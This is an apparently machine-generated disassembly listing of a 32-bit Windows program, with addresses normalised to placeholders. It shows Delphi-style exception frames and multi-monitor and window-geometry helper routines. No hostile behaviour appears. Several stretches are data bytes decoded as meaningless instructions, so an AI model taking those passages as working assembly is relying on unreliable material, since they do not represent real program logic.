jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_424a9c
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_424c9c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_424a9c
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_424c0c
sub_424d32
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_424a9c
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_424db3
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_424a9c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_424ea0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_424a9c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_424f74
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_424a9c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_425048
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_424a9c
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_4251e3
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_425209
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425210
retn
sub_425224
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425249
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425250
retn
sub_42525c
pushad
push edx
inc edx
add [ edi ] cl
or eax 0x6c654849
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
adc al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425250
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc edx
outsb
dec eax
insb
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
push esp
popad
outsb
popad
jb r-xdata
lodsd [ esi ]
jns r-xdata
imul esp [ ebp + 0x77 ] 0x52c87265
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
dec esp
push edx
inc edx
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11147265
inc eax
add [ ecx ] al
xchg ebx eax
cmp cl [ ecx ]
dec eax
insb
jae r-xdata
inc eax
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
or [ eax + 0x65 ] ecx
insb
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
inc edx
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edx * 2 ] al
outsb
je r-xdata
jo r-xdata
or [ eax + 0x65 ] ecx
insb
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
push ebx
outsb
je r-xdata
adc eax 0x65705349
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
je r-xdata
jns r-xdata
add [ edi ] cl
outsb
je r-xdata
dec [ ebx + 0x425298c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al cl
push edx
inc eax
add [ edx + esi + 0x40 ] dl
add [ eax + 0xe004032 ] dl
jns r-xdata
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
adc al 0x45
dec eax
insb
jo r-xdata
inc eax
outsb
je r-xdata
insb
jo r-xdata
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
add [ eax + 0x70 ] bh
jae r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
insd
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_425fef
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
push esi
je r-xdata
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
push cs
imul ebp [ edi + 0x6e ] 0x6800408d
push esp
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x54 ] ch
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x54 ] bh
inc edx
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0xffffffffe8004010 ]
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
jae r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0x53047265
inc edx
add [ ecx ] al
xchg bx ax
cld
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x425384c0 ]
push ebx
inc edx
add bh bh
inc [ ebx + edx * 2 + 0x42 ]
cld
inc edx
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
push edx
insd
adc al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x425308c0 ]
add [ edi ] cl
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_4040c8
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
lea eax [ eax ]
add al 0x54
inc edx
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp + 0x54040040 ]
jo r-xdata
cmp cl [ ecx ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
jmp r-xdata
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425ff6
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404afc
lea eax [ ebp - 0x8 ]
call sub_4056e0
retn
inc ebx
xor edi edi
int3
mov eax eax
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405724
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_424674
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4056f8
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405724
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_425620
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_425696
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_4257ac
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4056f8
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42569d
lea eax [ ebp - 0x8 ]
call sub_4056e0
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_425738
mov [ rw-data ] eax
sub_4256a4
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_425738
mov [ rw-data ] eax
mov ecx r-xdata
call sub_405724
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_4256fc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4056f8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_425738
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403270
mov dl 0x1
mov eax [ r-xdata ]
call sub_4245e0
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4245e0
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4245e0
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_404074
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_4257ac
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4258ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4256fc
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_424690
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_4056e0
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d02c
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_4056e0
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d02c
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4256fc
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_424690
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4256fc
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_424690
mov ecx r-xdata
call sub_405724
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4258b4
lea eax [ ebp - 0xc ]
call sub_4056e0
lea eax [ ebp - 0x8 ]
call sub_4056e0
retn
sub edx 0xfffffff8
sub_4258cc
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_424674
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_42590c
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_424674
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42593c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_425ace
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_424674
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425a69
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425ad5
lea eax [ ebp - 0x10 ]
call sub_404074
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_424674
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
mov eax esi
xor edx edx
call sub_424674
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_424674
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032a0
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_424674
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_425adc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_425bc1
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_4040c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425bc8
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404afc
lea eax [ ebp - 0x8 ]
call sub_4056e0
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_424674
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4056f8
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405724
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_424674
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4056f8
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405724
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_425df8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_425eeb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_4040c8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425ef2
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404afc
lea eax [ ebp - 0x10 ]
call sub_4056e0
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405724
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_424674
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_4056f8
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405724
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_425f10
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_425fef
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_4040c8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425ff6
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404afc
lea eax [ ebp - 0x8 ]
call sub_4056e0
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405724
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_424674
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4056f8
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405724
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_426010
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
